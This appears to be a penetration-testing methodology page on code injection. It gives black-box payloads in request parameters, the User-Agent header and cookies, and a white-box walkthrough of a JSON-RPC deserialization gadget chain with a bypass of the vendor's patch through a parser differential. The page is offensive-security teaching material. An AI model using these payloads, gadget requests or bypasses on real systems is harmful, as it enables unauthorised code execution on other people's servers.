# Code Injection

## Check List

## Methodology

### Black Box

#### Code Injection via Create Cache File

{% stepper %}
{% step %}
Interact with the target web application and observe that it generates client-side cache files to store application error messages
{% endstep %}

{% step %}
Identify a request sent from the client that includes user-controlled input within an array-based parameter (The important thing is that you have carefully considered who is also named `config`)

```http
POST /index.php?owa_do=base.optionsGeneral HTTP/1.1  
Host: analytics.[REDACTED].com  
User-Agent: Mozilla/5.0 (Fedora; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0  
Connection: keep-alive  
Content-Length: 95  
Content-Type: application/x-www-form-urlencoded  
Cookie: owa_p=8aacef0fbef40d5f8d8121ec2cc19aff386329fb030ead140fdf26491bcc5; owa_u=admin;; owa-u=admin; owa_p=8aacef0fbef40d5f8d8121ec2cc19aff386329fb030ead140fdf26491bcc5  
Accept-Encoding: gzip, deflate, br  

owa_action=base.optionsUpdate&owa_nonce=45faa7aae1&owa_config[darkshhadow]=<?php system('id'); ?> <--
```
{% endstep %}

{% step %}
Send the modified request to the server and observe that the application fails to properly handle the malicious input and generates an error
{% endstep %}

{% step %}
Confirm that the generated error is stored inside a cache file created by the application
{% endstep %}

{% step %}
Access the generated cache file directly through the browser
{% endstep %}

{% step %}
Observe that the injected PHP payload is executed and the command output is written inside the cache file
{% endstep %}
{% endstepper %}

***

#### Code Injection in User-Agent

{% stepper %}
{% step %}
Log into the target site and intercept requests using Burp Suite
{% endstep %}

{% step %}
Note that the target application uses PHP
{% endstep %}

{% step %}
Then make a simple request to the page, intercept the request, and send it to the Repeater
{% endstep %}

{% step %}
Send a normal request to make sure there are no errors, then inject the following value in the user-agent header

```http
GET / HTTP/1.1  
Host: example
Upgrade-Insecure-Requests: 1  
User-Agenttt: zerodiumsystem('id');]  <--- Code Injection
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
Accept-Encoding: gzip, deflate  
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8  
Connection: close
```
{% endstep %}

{% step %}
Send the request. In the server response, if the code was executed, the Code Injection vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Code Injection in Cookie Parameter

{% stepper %}
{% step %}
Log into the target site and intercept requests using Burp Suite
{% endstep %}

{% step %}
Intercept a simple request and check if the Cookie parameter is Base64 encoded

```http
GET /dashboard HTTP/1.1
Host: exmaple.com
Cookie: session=VXNlcj10ZXN0dXNlcg==
```
{% endstep %}

{% step %}
Delete the cookie value and then Base64 encode a malicious code based on the language written and insert it into the cookie, Payload before encoding

```php
<?php system('id'); ?>
```

Payload after Base64 Encode\\

```
PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```
{% endstep %}

{% step %}
Injected request

```http
GET /dashboard HTTP/1.1
Host: example.com
Cookie: session=PD9waHAgc3lzdGVtKCd pZCcpOyA/Pg==
```
{% endstep %}

{% step %}
Then send the request and check if the code is executed in the server response, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Code Injection In url Parameters

{% stepper %}
{% step %}
Log in to the target site, operate the program as a normal user, and intercept requests using the Burp Suite program
{% endstep %}

{% step %}
Log in to the target site, act as a normal user, examine the features, and intercept requests using the Burp Suite program
{% endstep %}

{% step %}
On the target site, look for features and requests that request an external service or an external URL, such as the `targetUrls` parameter
{% endstep %}

{% step %}
Then, in the request sent to Url, give this parameter a URL that contains a javascript code or, depending on the language in which the program works, a JavaScript code, like

```bash
https://example.com/cms/gather/getArticle?targetUrl=http://jsonplaceholder.typicode.com/posts/1&parseData=return+process.version+||+"Code+Injection+successful"
```
{% endstep %}

{% step %}
in the Response

```json
{
  "code": 200,
  "msg": "success",
  "source": {
    "userId": 1,
    "id": 1,
    "title": "sunt aut facere repellat provident occaecati excepturi optio reprehenderit",
    "body": "quia et suscipit\nsuscipit recusandae consequuntur expedita et cum\nreprehenderit molestiae ut ut quas totam\nnostrum rerum est autem sunt rem eveniet architecto"
  },
  "data": "uid=0(root) gid=0(root) groups=0(root)\n"
}
```
{% endstep %}
{% endstepper %}

***

### White Box

#### Unauthenticated JSON-RPC Deserialization via Method Invocation Abuse and Parser Differential Bypass

{% stepper %}
{% step %}
Map the entire target system or product using the Burp Suite tool
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
In the target application (such as a Help Desk product), go to the Settings section and look for features that allow uploading UI themes, images (such as PNG), or CSS files
{% endstep %}

{% step %}
These features often use a layered structure or act as a bridge between the user interface and server-side logic (for example, `AjaxProxy`)
{% endstep %}

{% step %}
Identify entry points such as “Look and Feel” that connect to sensitive internal components (proxy/handler) and may provide indirect access to server-side logic or unusual behavior
{% endstep %}

{% step %}
Check whether there are endpoints that accept a method name from user input and allow passing arguments (`arg`)

```http
POST /helpdesk/WebObjects/Helpdesk.woa/ajax/9.7.43.0.0.0.4.3.7.0.7.1.1.1 HTTP/1.1
Host: 192.168.111.168:8443
Cookie: ...
Content-Length: 50
X-Xsrf-Token: 4f5024e8-8a44-417e-be88-e20de1d22088
Content-Type: text/plain

{
	"id":1,
	"method":"system.listMethods",
	"params":[]
}
```
{% endstep %}

{% step %}
Send a normal request and list all methods that can be invoked

```http
{
	"result":
		[
			"wopage.validateTakeValueForKeyPath",
			"wopage.takeValueForKey",
			"wopage.onChangeFunction",
			"wopage.cancelLabel",
			"wopage.srcUrl",
			"wopage._isPage",
			"..."
		}
}
```
{% endstep %}

{% step %}
Focus on methods that accept generic parameters such as `Object`, or methods that work with internal properties and state, such as `wopage.takeValueForKey`

{% tabs %}
{% tab title="C#" %}
```c#
public void takeValueForKey(object value, string key)
{
	DefaultImplementation.takeValueForKey(this, value, key);
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void takeValueForKey(Object value, String key) {
	DefaultImplementation.takeValueForKey(this, value, key);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function takeValueForKey($value, $key)
{
	DefaultImplementation::takeValueForKey($this, $value, $key);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function takeValueForKey(value, key)
{
	DefaultImplementation.takeValueForKey(this, value, key);
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Trace the request flow from the entry point to the final method using your XMind map. At this stage, `ask:` “How can a JSON request be passed to a method that expects an `Object`?” This usually means there is an intermediate method that converts JSON into an object

{% tabs %}
{% tab title="C#" %}
```c#
public WOActionResults handleRequest(WORequest request, WOContext context)
{
    //...
    try
    {
        object proxy;
        JSONBridge jSONBridge;
        input = new JSONObject(inputString); // [1]
        //...
        output = jSONBridge.call(new object[] { request, context, ajaxResponse, proxy }, input); // [2]
    }
    catch (NoSuchElementException e)
    {
        log.error("No method in request");
        output = "method not found (session may have timed out)";
    }
    //...
}
```
{% endtab %}

{% tab title="Java" %}
```java
public WOActionResults handleRequest(WORequest request, WOContext context) {
    //...
    try {
        Object proxy;
        JSONBridge jSONBridge;
        input = new JSONObject(inputString); // [1]
        //...
        output = jSONBridge.call(new Object[] { request, context, ajaxResponse, proxy }, input); // [2]
    } catch (NoSuchElementException e) {
        log.error("No method in request");
        output = "method not found (session may have timed out)";
    }
    //...
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function handleRequest($request, $context)
{
    //...
    try
    {
        $proxy = null;
        $jSONBridge = null;
        $input = new JSONObject($inputString); // [1]
        //...
        $output = $jSONBridge->call(array($request, $context, $ajaxResponse, $proxy), $input); // [2]
    }
    catch (NoSuchElementException $e)
    {
        $log->error("No method in request");
        $output = "method not found (session may have timed out)";
    }
    //...
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function handleRequest(request, context)
{
    //...
    try
    {
        let proxy;
        let jSONBridge;
        input = new JSONObject(inputString); // [1]
        //...
        output = jSONBridge.call([ request, context, ajaxResponse, proxy ], input); // [2]
    }
    catch (e)
    {
        if (e instanceof NoSuchElementException)
        {
            log.error("No method in request");
            output = "method not found (session may have timed out)";
        }
    }
    //...
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review methods such as `JSONBridge.call`, which are responsible for converting the request from JSON into an object

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(JsonConvert\.DeserializeObject)|(JavaScriptSerializer)|(Type\.GetMethod)|(Invoke\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
(JSONObject\s*\()|(getString\s*\(\s*["']method["'])|(getJSONArray\s*\()|(unmarshallArgs)|(method\.invoke)|(Class\.forName)|(Method\.invoke)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(unserialize\s*\()|(call_user_func)|(ReflectionMethod)|(invoke\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(JSON\.parse)|(Function\s*\()|(eval\s*\()|(req\.body\.method)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
JsonConvert\.DeserializeObject|JavaScriptSerializer|Type\.GetMethod|Invoke\s*\(
```
{% endtab %}

{% tab title="Java" %}
```regexp
JSONObject\s*\(|getString\s*\(\s*["']method["']|getJSONArray\s*\(|unmarshallArgs|method\.invoke|Class\.forName|Method\.invoke
```
{% endtab %}

{% tab title="PHP" %}
```regexp
unserialize\s*\(|call_user_func|ReflectionMethod|invoke\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
JSON\.parse|Function\s*\(|eval\s*\(|req\.body\.method
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Patterns**

{% tabs %}
{% tab title="C#" %}
```c#
public JSONRPCResult call(Object[] context, JSONObject jsonReq) {
    String encodedMethod;
    Object requestId;
    JSONArray arguments;
    JSONArray fixups;
    try {
        encodedMethod = jsonReq.getString("method"); // [1]
        arguments = jsonReq.getJSONArray("params"); // [2]
        requestId = jsonReq.opt("id");
        fixups = jsonReq.optJSONArray("fixups");
    } catch (JSONException var21) {
        log.error("no method or parameters in request");
        return new JSONRPCResult(591, (Object)null, "method not found (session may have timed out)");
    }
    //...
}

if ((method = this.resolveMethod(methodMap, methodName, arguments)) == null) { // [1]
    return new JSONRPCResult(591, requestId, "method not found (session may have timed out)");
} else {
    JSONRPCResult result;
    try {
        if (log.isDebugEnabled()) {
            log.debug("invoking " + method.getReturnType().getName() + " " + method.getName() + "(" + argSignature(method) + ")");
        }

        Object[] javaArgs = this.unmarshallArgs(context, method, arguments); // [2]

        Object returnObj = method.invoke(itsThis, javaArgs); // [3]

        SerializerState serializerState = new SerializerState();
        Object json = ser.marshall(serializerState, (Object)null, returnObj, "r"); // [4]

        result = new JSONRPCResult(0, requestId, json, serializerState.getFixUps());
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public JSONRPCResult call(Object[] context, JSONObject jsonReq) {
    String encodedMethod;
    Object requestId;
    JSONArray arguments;
    JSONArray fixups;
    try {
        encodedMethod = jsonReq.getString("method"); // [1]
        arguments = jsonReq.getJSONArray("params"); // [2]
        requestId = jsonReq.opt("id");
        fixups = jsonReq.optJSONArray("fixups");
    } catch (JSONException var21) {
        log.error("no method or parameters in request");
        return new JSONRPCResult(591, null, "method not found (session may have timed out)");
    }
    //...
}

if ((method = this.resolveMethod(methodMap, methodName, arguments)) == null) { // [1]
    return new JSONRPCResult(591, requestId, "method not found (session may have timed out)");
} else {
    JSONRPCResult result;
    try {
        if (log.isDebugEnabled()) {
            log.debug("invoking " + method.getReturnType().getName() + " " + method.getName() + "(" + argSignature(method) + ")");
        }

        Object[] javaArgs = this.unmarshallArgs(context, method, arguments); // [2]

        Object returnObj = method.invoke(itsThis, javaArgs); // [3]

        SerializerState serializerState = new SerializerState();
        Object json = ser.marshall(serializerState, null, returnObj, "r"); // [4]

        result = new JSONRPCResult(0, requestId, json, serializerState.getFixUps());
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function call($context, $jsonReq)
{
    $encodedMethod = null;
    $requestId = null;
    $arguments = null;
    $fixups = null;

    try
    {
        $encodedMethod = $jsonReq->getString("method"); // [1]
        $arguments = $jsonReq->getJSONArray("params"); // [2]
        $requestId = $jsonReq->opt("id");
        $fixups = $jsonReq->optJSONArray("fixups");
    }
    catch (JSONException $var21)
    {
        $log->error("no method or parameters in request");
        return new JSONRPCResult(591, null, "method not found (session may have timed out)");
    }
    //...
}

if (($method = $this->resolveMethod($methodMap, $methodName, $arguments)) == null) // [1]
{
    return new JSONRPCResult(591, $requestId, "method not found (session may have timed out)");
}
else
{
    $result = null;
    try
    {
        if ($log->isDebugEnabled())
        {
            $log->debug("invoking " . $method->getReturnType()->getName() . " " . $method->getName());
        }

        $javaArgs = $this->unmarshallArgs($context, $method, $arguments); // [2]

        $returnObj = $method->invoke($itsThis, $javaArgs); // [3]

        $serializerState = new SerializerState();
        $json = $ser->marshall($serializerState, null, $returnObj, "r"); // [4]

        $result = new JSONRPCResult(0, $requestId, $json, $serializerState->getFixUps());
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function call(context, jsonReq)
{
    let encodedMethod;
    let requestId;
    let arguments;
    let fixups;

    try
    {
        encodedMethod = jsonReq.getString("method"); // [1]
        arguments = jsonReq.getJSONArray("params"); // [2]
        requestId = jsonReq.opt("id");
        fixups = jsonReq.optJSONArray("fixups");
    }
    catch (e)
    {
        log.error("no method or parameters in request");
        return new JSONRPCResult(591, null, "method not found (session may have timed out)");
    }
    //...
}

if ((method = this.resolveMethod(methodMap, methodName, arguments)) == null) // [1]
{
    return new JSONRPCResult(591, requestId, "method not found (session may have timed out)");
}
else
{
    let result;
    try
    {
        if (log.isDebugEnabled())
        {
            log.debug("invoking " + method.getReturnType().getName() + " " + method.getName());
        }

        let javaArgs = this.unmarshallArgs(context, method, arguments); // [2]

        let returnObj = method.invoke(itsThis, javaArgs); // [3]

        let serializerState = new SerializerState();
        let json = ser.marshall(serializerState, null, returnObj, "r"); // [4]

        result = new JSONRPCResult(0, requestId, json, serializerState.getFixUps());
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Go deeper into the JSON-to-object conversion process and determine how the application selects the target object type and deserializer. Check whether this is based on parameter values or input data
{% endstep %}

{% step %}
If `BeanSerializer` is used, review the following Is the target class taken from user input (for example, `javaClass`)?, Is the object created through its constructor?, Are values assigned through setter methods?
{% endstep %}

{% step %}
Review all libraries used by the application (`jar` / `lib`) and identify dependencies with a history of gadget chains or deserialization behavior (such as `C3P0`, Commons libraries, or Spring)
{% endstep %}

{% step %}
Check whether public gadget chains are available and whether they are compatible with the application’s constraints, such as setter-based initialization, string/object properties, or internal behaviors like `readObject`
{% endstep %}

{% step %}
If object-based deserialization is possible, use a field such as `javaClass` to specify the gadget class, build the gadget payload, and send the request

```http
POST /helpdesk/WebObjects/Helpdesk.woa/ajax/9.7.43.0.0.0.4.3.7.0.7.1.1.1 HTTP/1.1
Host: 192.168.111.168:8443
Cookie: ...
Content-Length: 311
X-Xsrf-Token: 4f5024e8-8a44-417e-be88-e20de1d22088
Content-Type: text/plain

{
	"id": 1, 
	"method": "wopage.takeValueForKey", 
	"params": [
		{
			"javaClass": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", 
			"userOverridesAsString": "HexAsciiSerializedMap:aced0005737...hex-encoded-deser-gadget...0178a"
		},
		"test" 
	]
}
```
{% endstep %}

{% step %}
If the application uses input security checks, identify whether they rely on regular expressions and blacklists

{% tabs %}
{% tab title="C#" %}
```c#
private void checkSuspeciousPayload(WORequest request) {
   byte[] bytes = request.content().bytes();
   String requestPayload = new String(bytes);
   if (!StringUtils.isBlank(requestPayload)) {
      String normalizeAndDecodePayload = normalizeAndDecodeInput(requestPayload); // [1]
      if (request.uri().contains("ajax") && isJSON(normalizeAndDecodePayload) && normalizeAndDecodePayload.getBytes().length > 1048) { // [2]
         rootLogger().error("Payload exceeds maximum allowed size for AJAX request. Payload= " + normalizeAndDecodePayload);
         this.logSuspiciousRequestDetails(request);
         throw new MissingCsrfTokenException("invalid request.");
      } else {
         if (SUSPICIOUS_PATTERNS.matcher(normalizeAndDecodePayload).find()) {
            Matcher matcher = SUSPICIOUS_PATTERNS.matcher(normalizeAndDecodePayload);
            if (matcher.find()) { // [3]
               String matchedKeyword = matcher.group();
               if (!matchedKeyword.startsWith("java.") || !this.isWhitelisted(normalizeAndDecodePayload)) {
                  rootLogger().error("Suspicious content detected in the request payload. Matched keyword: " + matchedKeyword + ". Payload= " + normalizeAndDecodePayload);
                  this.logSuspiciousRequestDetails(request);
                  throw new MissingCsrfTokenException("invalid request");
               }

               rootLogger().info("Whitelisted payload with matched keyword: " + matchedKeyword + ". Payload= " + normalizeAndDecodePayload);
            }
         }

      }
   }
}
```
{% endtab %}

{% tab title="Java" %}
```java
private void checkSuspeciousPayload(WORequest request) {
   byte[] bytes = request.content().bytes();
   String requestPayload = new String(bytes);
   if (!StringUtils.isBlank(requestPayload)) {
      String normalizeAndDecodePayload = normalizeAndDecodeInput(requestPayload); // [1]
      if (request.uri().contains("ajax") && isJSON(normalizeAndDecodePayload) && normalizeAndDecodePayload.getBytes().length > 1048) { // [2]
         rootLogger().error("Payload exceeds maximum allowed size for AJAX request. Payload= " + normalizeAndDecodePayload);
         this.logSuspiciousRequestDetails(request);
         throw new MissingCsrfTokenException("invalid request.");
      } else {
         if (SUSPICIOUS_PATTERNS.matcher(normalizeAndDecodePayload).find()) {
            Matcher matcher = SUSPICIOUS_PATTERNS.matcher(normalizeAndDecodePayload);
            if (matcher.find()) { // [3]
               String matchedKeyword = matcher.group();
               if (!matchedKeyword.startsWith("java.") || !this.isWhitelisted(normalizeAndDecodePayload)) {
                  rootLogger().error("Suspicious content detected in the request payload. Matched keyword: " + matchedKeyword + ". Payload= " + normalizeAndDecodePayload);
                  this.logSuspiciousRequestDetails(request);
                  throw new MissingCsrfTokenException("invalid request");
               }

               rootLogger().info("Whitelisted payload with matched keyword: " + matchedKeyword + ". Payload= " + normalizeAndDecodePayload);
            }
         }

      }
   }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function checkSuspeciousPayload($request)
{
   $bytes = $request->content()->bytes();
   $requestPayload = new string($bytes);

   if (!StringUtils::isBlank($requestPayload))
   {
      $normalizeAndDecodePayload = $this->normalizeAndDecodeInput($requestPayload); // [1]

      if ($request->uri()->contains("ajax") && $this->isJSON($normalizeAndDecodePayload) && strlen($normalizeAndDecodePayload) > 1048) // [2]
      {
         $this->rootLogger()->error("Payload exceeds maximum allowed size for AJAX request. Payload= " . $normalizeAndDecodePayload);
         $this->logSuspiciousRequestDetails($request);
         throw new MissingCsrfTokenException("invalid request.");
      }
      else
      {
         if ($this->SUSPICIOUS_PATTERNS->matcher($normalizeAndDecodePayload)->find())
         {
            $matcher = $this->SUSPICIOUS_PATTERNS->matcher($normalizeAndDecodePayload);

            if ($matcher->find()) // [3]
            {
               $matchedKeyword = $matcher->group();

               if (strpos($matchedKeyword, "java.") !== 0 || !$this->isWhitelisted($normalizeAndDecodePayload))
               {
                  $this->rootLogger()->error(
                     "Suspicious content detected in the request payload. Matched keyword: "
                     . $matchedKeyword . ". Payload= " . $normalizeAndDecodePayload
                  );

                  $this->logSuspiciousRequestDetails($request);
                  throw new MissingCsrfTokenException("invalid request");
               }

               $this->rootLogger()->info(
                  "Whitelisted payload with matched keyword: " . $matchedKeyword .
                  ". Payload= " . $normalizeAndDecodePayload
               );
            }
         }
      }
   }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function checkSuspeciousPayload(request)
{
   let bytes = request.content().bytes();
   let requestPayload = new String(bytes);

   if (!StringUtils.isBlank(requestPayload))
   {
      let normalizeAndDecodePayload = normalizeAndDecodeInput(requestPayload); // [1]

      if (request.uri().contains("ajax") && isJSON(normalizeAndDecodePayload) && normalizeAndDecodePayload.getBytes().length > 1048) // [2]
      {
         rootLogger().error("Payload exceeds maximum allowed size for AJAX request. Payload= " + normalizeAndDecodePayload);
         this.logSuspiciousRequestDetails(request);
         throw new MissingCsrfTokenException("invalid request.");
      }
      else
      {
         if (SUSPICIOUS_PATTERNS.matcher(normalizeAndDecodePayload).find())
         {
            let matcher = SUSPICIOUS_PATTERNS.matcher(normalizeAndDecodePayload);

            if (matcher.find()) // [3]
            {
               let matchedKeyword = matcher.group();

               if (!matchedKeyword.startsWith("java.") || !this.isWhitelisted(normalizeAndDecodePayload))
               {
                  rootLogger().error(
                     "Suspicious content detected in the request payload. Matched keyword: "
                     + matchedKeyword + ". Payload= " + normalizeAndDecodePayload
                  );

                  this.logSuspiciousRequestDetails(request);
                  throw new MissingCsrfTokenException("invalid request");
               }

               rootLogger().info(
                  "Whitelisted payload with matched keyword: " + matchedKeyword +
                  ". Payload= " + normalizeAndDecodePayload
               );
            }
         }
      }
   }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Trace input processing step by step and determine when decoding occurs and whether the regex is applied before or after decoding
{% endstep %}

{% step %}
Check whether the application uses multiple parsers: one for validation and another for final processing (such as deserialization)
{% endstep %}

{% step %}
Review the final parser and identify any special decoding behavior. For example, `JSONObject` may decode hexadecimal values, while the validation parser performs only standard decoding, which may allow bypassing security checks

{% tabs %}
{% tab title="C#" %}
```c#
case '\\\\':
	c = this.next();
	switch (c) {
	  case 'b':
	      sb.append('\\b');
	      continue;
	   //...
	   case 'u':
        sb.append((char)Integer.parseInt(this.next((int)4), 16));
        continue;
     case 'x': // [1]
	      sb.append((char)Integer.parseInt(this.next((int)2), 16));
	      continue;
```
{% endtab %}

{% tab title="Java" %}
```java
case '\\':
	c = this.next();
	switch (c) {
	  case 'b':
	      sb.append("\\b");
	      continue;
	   //...
	   case 'u':
        sb.append((char)Integer.parseInt(this.next((int)4), 16));
        continue;
     case 'x': // [1]
	      sb.append((char)Integer.parseInt(this.next((int)2), 16));
	      continue;
	}
```
{% endtab %}

{% tab title="PHP" %}
```php
case '\\':
	$c = $this->next();
	switch ($c) {
	  case 'b':
	      $sb .= "\\b";
	      continue;
	   //...
	   case 'u':
        $sb .= chr(hexdec($this->next(4)));
        continue;
     case 'x': // [1]
	      $sb .= chr(hexdec($this->next(2)));
	      continue;
	}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
case '\\':
	c = this.next();
	switch (c) {
	  case 'b':
	      sb += "\\b";
	      continue;
	   //...
	   case 'u':
        sb += String.fromCharCode(parseInt(this.next(4), 16));
        continue;
     case 'x': // [1]
	      sb += String.fromCharCode(parseInt(this.next(2), 16));
	      continue;
	}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether there is a payload length limit and determine its threshold (for example, 1048 bytes). Analyze the input processing flow and determine the order of execution

{% tabs %}
{% tab title="C#" %}
```c#
string normalizeAndDecodePayload = normalizeAndDecodeInput(requestPayload); // [1]
if (request.uri().contains("ajax") && isJSON(normalizeAndDecodePayload) && normalizeAndDecodePayload.getBytes().length > 1048) { // [2]
```
{% endtab %}

{% tab title="Java" %}
```java
String normalizeAndDecodePayload = normalizeAndDecodeInput(requestPayload); // [1]
if (request.uri().contains("ajax") && isJSON(normalizeAndDecodePayload) && normalizeAndDecodePayload.getBytes().length > 1048) { // [2]
```
{% endtab %}

{% tab title="PHP" %}
```php
$normalizeAndDecodePayload = normalizeAndDecodeInput($requestPayload); // [1]
if (strpos($request->uri(), "ajax") !== false && isJSON($normalizeAndDecodePayload) && strlen($normalizeAndDecodePayload) > 1048) { // [2]
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
let normalizeAndDecodePayload = normalizeAndDecodeInput(requestPayload); // [1]
if (request.uri().includes("ajax") && isJSON(normalizeAndDecodePayload) && normalizeAndDecodePayload.length > 1048) { // [2]
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the JSON validation function (`isJSON`) and identify which parsers are used (such as `JSONObject` or `JSONArray`). Determine whether the length check is only applied when the input is valid JSON or whether it is independent of the validation result. Then attempt to trigger errors to bypass the restriction
{% endstep %}

{% step %}
Review the patch and determine exactly what changes were added to prevent exploitation

{% tabs %}
{% tab title="C#" %}
```c#
public static string sanitizeJson(string json)
{
   string fast = neutralizeTopLevelParamsAndFixups(json);

   try
   {
      JsonNode root = MAPPER.ReadTree(fast); // [1]
      if (root != null && root.IsObject())
      {
         ObjectNode obj = (ObjectNode)root;

         if (obj.Has("params")) // [2]
         {
            obj.Set("params", MAPPER.CreateArrayNode()); // [3]
         }

         if (obj.Has("fixups"))
         {
            obj.Set("fixups", MAPPER.CreateObjectNode());
         }

         stripDangerousFields(root);
      }

      return MAPPER.WriteValueAsString(root);
   }
   catch (Exception)
   {
      return fast;
   }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static String sanitizeJson(String json) {
   String fast = neutralizeTopLevelParamsAndFixups(json);

   try {
      JsonNode root = MAPPER.readTree(fast); // [1]
      if (root != null && root.isObject()) {
         ObjectNode obj = (ObjectNode)root;

         if (obj.has("params")) { // [2]
            obj.set("params", MAPPER.createArrayNode()); // [3]
         }

         if (obj.has("fixups")) {
            obj.set("fixups", MAPPER.createObjectNode());
         }

         stripDangerousFields(root);
      }

      return MAPPER.writeValueAsString(root);
   } catch (Exception var4) {
      return fast;
   }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public static function sanitizeJson($json)
{
   $fast = neutralizeTopLevelParamsAndFixups($json);

   try {
      $root = $MAPPER->readTree($fast); // [1]

      if ($root != null && $root->isObject()) {
         $obj = $root;

         if ($obj->has("params")) { // [2]
            $obj->set("params", $MAPPER->createArrayNode()); // [3]
         }

         if ($obj->has("fixups")) {
            $obj->set("fixups", $MAPPER->createObjectNode());
         }

         stripDangerousFields($root);
      }

      return $MAPPER->writeValueAsString($root);
   } catch (Exception $var4) {
      return $fast;
   }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
static sanitizeJson(json)
{
   let fast = neutralizeTopLevelParamsAndFixups(json);

   try
   {
      let root = MAPPER.readTree(fast); // [1]

      if (root != null && root.isObject())
      {
         let obj = root;

         if (obj.has("params")) { // [2]
            obj.set("params", MAPPER.createArrayNode()); // [3]
         }

         if (obj.has("fixups"))
         {
            obj.set("fixups", MAPPER.createObjectNode());
         }

         stripDangerousFields(root);
      }

      return MAPPER.writeValueAsString(root);
   }
   catch (e)
   {
      return fast;
   }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Identify the parser used during the sanitization phase (for example, Jackson) and analyze its decoding behavior. Check whether the parser used during sanitization differs from the parser used during deserialization
{% endstep %}

{% step %}
Identify differences in supported escape sequences between parsers (for example, Jackson may not support `\xNN`, while another parser does)
{% endstep %}

{% step %}
Check whether the sanitizer can detect the modified field. If it cannot, sanitization actions (such as removing parameters) may not occur, allowing a bypass
{% endstep %}

{% step %}
Analyze session creation and page initialization, and determine whether an unauthenticated session can be created with a simple request (such as `GET`)
{% endstep %}

{% step %}
Review how the page hierarchy and flow are processed step by step and how page-specific identifiers are used. Then send invalid values for path parameters (such as `elementID`) and observe the system behavior
{% endstep %}

{% step %}
Analyze the error-handling logic and determine which methods are executed when a failure occurs

{% tabs %}
{% tab title="C#" %}
```c#
private WOResponse _dispatchWithPreparedSession(WOSession aSession, WOContext aContext, NSDictionary someElements) {
  WOComponent aPage = null;
  WOResponse aResponse = null;
  String aPageName = (String)someElements.objectForKey("wopage");
  String oldContextID = aContext._requestContextID();
  String oldSessionID = (String)someElements.objectForKey(WOApplication.application().sessionIdKey());
  WOApplication anApplication = WOApplication.application();
  boolean clearIDsInCookies = false;
  if (oldSessionID != null && oldContextID != null) {
      aPage = this._restorePageForContextID(oldContextID, aSession); // [1]
      if (aPage == null) {
          if (!anApplication._isPageRecreationEnabled()) {
              return anApplication.handlePageRestorationErrorInContext(aContext); // [2]
          }
	//...
}
```
{% endtab %}

{% tab title="Java" %}
```java
private WOResponse _dispatchWithPreparedSession(WOSession aSession, WOContext aContext, NSDictionary someElements) {
  WOComponent aPage = null;
  WOResponse aResponse = null;
  String aPageName = (String)someElements.objectForKey("wopage");
  String oldContextID = aContext._requestContextID();
  String oldSessionID = (String)someElements.objectForKey(WOApplication.application().sessionIdKey());
  WOApplication anApplication = WOApplication.application();
  boolean clearIDsInCookies = false;

  if (oldSessionID != null && oldContextID != null) {
      aPage = this._restorePageForContextID(oldContextID, aSession); // [1]
      if (aPage == null) {
          if (!anApplication._isPageRecreationEnabled()) {
              return anApplication.handlePageRestorationErrorInContext(aContext); // [2]
          }
      //...
      }
  }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function _dispatchWithPreparedSession($aSession, $aContext, $someElements)
{
  $aPage = null;
  $aResponse = null;
  $aPageName = $someElements->objectForKey("wopage");
  $oldContextID = $aContext->_requestContextID();
  $oldSessionID = $someElements->objectForKey(WOApplication::application()->sessionIdKey());
  $anApplication = WOApplication::application();
  $clearIDsInCookies = false;

  if ($oldSessionID != null && $oldContextID != null)
  {
      $aPage = $this->_restorePageForContextID($oldContextID, $aSession); // [1]

      if ($aPage == null)
      {
          if (!$anApplication->_isPageRecreationEnabled())
          {
              return $anApplication->handlePageRestorationErrorInContext($aContext); // [2]
          }
      //...
      }
  }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
_dispatchWithPreparedSession(aSession, aContext, someElements)
{
  let aPage = null;
  let aResponse = null;
  let aPageName = someElements.objectForKey("wopage");
  let oldContextID = aContext._requestContextID();
  let oldSessionID = someElements.objectForKey(WOApplication.application().sessionIdKey());
  let anApplication = WOApplication.application();
  let clearIDsInCookies = false;

  if (oldSessionID != null && oldContextID != null)
  {
      aPage = this._restorePageForContextID(oldContextID, aSession); // [1]

      if (aPage == null)
      {
          if (!anApplication._isPageRecreationEnabled())
          {
              return anApplication.handlePageRestorationErrorInContext(aContext); // [2]
          }
      //...
      }
  }
}
```
{% endtab %}
